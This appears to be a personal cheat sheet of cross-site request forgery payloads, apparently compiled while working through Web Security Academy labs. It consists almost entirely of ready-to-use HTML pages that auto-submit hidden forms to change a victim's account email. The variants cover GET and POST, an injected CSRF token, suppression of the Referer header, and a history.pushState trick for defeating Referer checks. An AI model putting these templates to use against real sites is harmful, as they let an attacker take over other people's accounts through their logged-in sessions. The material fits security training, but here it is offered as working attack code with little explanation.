## Cross-site request forgery

SameSite=Strict
SameSite=Lux
SameSite=None

### Standard GET CSRF:
```
<html> 
<body> 
<form action="https://vulnerable-website.com/my-account/change-email"> 
<input type="hidden" name="email" value="evil@gmail.com" /> 
</form> 
<script> document.forms[0].submit(); </script> 
</body>
</html>
```

### Standard POST CSRF:
```
<html> 
<body> 
<form action="https://vulnerable-website.com/my-account/change-email" method="POST"> 
<input type="hidden" name="email" value="evil@gmail.com" /> 
</form> 
<script> document.forms[0].submit(); </script> 
</body>
</html>
```

### Standard POST CSRF with new inputs:
```
<html> 
<body> 
<form action="https://vulnerable-website.com/my-account/change-email" method="POST"> 
<input type="hidden" name="email" value="evil@gmail.com" />
<input type="hidden" name="csrf" value="SDGDSGHRTG$rewt65RT$T4t45" /> 
</form> 
<script> document.forms[0].submit(); </script> 
</body>
</html>
```

### POST CSRF with NoREFFER header:
```
<html>
<head>
<title>CSRF Exploit </title>
  <meta name="referrer" content="no-referrer">
</head>
<body>
  <form action="https://0a2b00a103d9639280702748000e0044.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="pwned@err.net" />
    <input type="submit" value="Submit request" />
  </form>
  <script>
    document.forms[0].submit();
  </script>
</body>
</html>
```


```
<html>
<head>
  <title>CSRF Exploit </title>
</head>
<script>history.pushState("", "", "/?0a2b00a103d9639280702748000e0044.web-security-academy.net")</script>
<body>
  <form action="https://0a2b00a103d9639280702748000e0044.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="pwn234@gmail.com" />
    <input type="submit" value="Submit request" />
  </form>
  <script>
    document.forms[0].submit();
  </script>
</body>
</html>
```
